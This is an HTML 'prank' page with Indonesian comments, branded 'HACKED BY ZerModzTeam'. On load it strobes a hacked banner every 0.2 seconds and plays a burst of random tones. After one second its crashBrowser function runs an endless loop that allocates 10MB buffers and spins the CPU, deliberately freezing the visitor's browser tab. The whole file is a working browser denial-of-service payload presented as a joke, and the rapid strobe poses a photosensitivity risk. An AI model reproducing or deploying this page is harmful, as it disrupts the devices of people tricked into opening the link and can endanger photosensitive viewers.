<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZerModzTeam Prank</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
        }
        #hacked-text {
            font-size: 4rem;
            font-weight: bold;
            text-align: center;
            padding: 20px;
            animation: blink 0.2s infinite;
            border-radius: 10px;
        }
        @keyframes blink {
            0% { color: black; background-color: white; }
            50% { color: white; background-color: black; }
            100% { color: black; background-color: white; }
        }
        /* tambahan biar mantap */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="hacked-text">HACKED BY ZerModzTeam</div>

    <script>
        (function() {
            // Ambil elemen teks
            const textEl = document.getElementById('hacked-text');

            // ======================== SOUND ========================
            function playChaosSounds() {
                try {
                    // Inisialisasi AudioContext (bisa jalan kalau dibuka via link)
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (!AudioContext) {
                        console.warn("Browser gak support AudioContext, suara batal.");
                        return;
                    }
                    const audioCtx = new AudioContext();

                    // Master gain biar gak terlalu keras
                    const masterGain = audioCtx.createGain();
                    masterGain.gain.value = 0.1; // volume kecil biar gak sakit telinga
                    masterGain.connect(audioCtx.destination);

                    // Buat 20 oscillator dengan parameter random
                    const oscs = [];
                    const types = ['sine', 'square', 'sawtooth', 'triangle'];
                    for (let i = 0; i < 20; i++) {
                        const osc = audioCtx.createOscillator();
                        // type random
                        osc.type = types[Math.floor(Math.random() * types.length)];
                        // frekuensi random antara 100 - 2000 Hz
                        osc.frequency.value = 100 + Math.random() * 1900;
                        
                        // gain per osc kecil biar total gak overload
                        const gainNode = audioCtx.createGain();
                        gainNode.gain.value = 0.01 + Math.random() * 0.04; // 0.01 - 0.05
                        
                        // routing: osc -> gainNode -> masterGain -> destination
                        osc.connect(gainNode);
                        gainNode.connect(masterGain);
                        
                        // mulai sekarang, berhenti 1 detik lagi
                        const now = audioCtx.currentTime;
                        osc.start(now);
                        osc.stop(now + 1); // otomatis stop setelah 1 detik
                        
                        oscs.push(osc);
                    }

                    // Kalau context suspended, coba resume (tapi biasanya kalau via link udah aktif)
                    if (audioCtx.state === 'suspended') {
                        audioCtx.resume();
                    }
                } catch (e) {
                    console.error('Sound error:', e);
                }
            }

            // ======================== CRASH SIMULATION ========================
            function crashBrowser() {
                // Fungsi ini bikin tab jadi hang / nge-freeze
                // Loop tanpa henti + alokasi memori biar keliatan "crash"
                // (Gak beneran nge-crash Chrome, cuma bikin tab gak responsif)
                console.log("Mulai crash...");
                
                // Sembunyikan teks (sudah di-hidden sebelumnya, tapi buat jaga-jaga)
                textEl.classList.add('hidden');
                
                // Opsi 1: Loop CPU murni
                // while (true) {
                //     for (let i = 0; i < 1e7; i++) { Math.sqrt(i); }
                // }

                // Opsi 2: Loop + alokasi memori (lebih berasa "berat")
                const arr = [];
                while (true) {
                    try {
                        // Tambah 10MB tiap iterasi
                        arr.push(new ArrayBuffer(10 * 1024 * 1024));
                    } catch (e) {
                        // Kalau memory penuh, lanjut loop aja biar CPU kepanasan
                        console.log('memory full, tapi tetap loop');
                    }
                    // tambah dummy biar CPU ngebut
                    for (let j = 0; j < 1000000; j++) {
                        Math.random();
                    }
                }
            }

            // ======================== EKSEKUSI ========================
            // Mainkan suara segera
            playChaosSounds();

            // Teks akan otomatis kedip sampai 1 detik, lalu hilang dan crash dimulai
            setTimeout(() => {
                // Sembunyikan teks
                textEl.style.display = 'none'; // langsung ilang

                // Panggil fungsi crash
                crashBrowser();
            }, 1000); // tepat 1 detik
        })();
    </script>
</body>
</html>
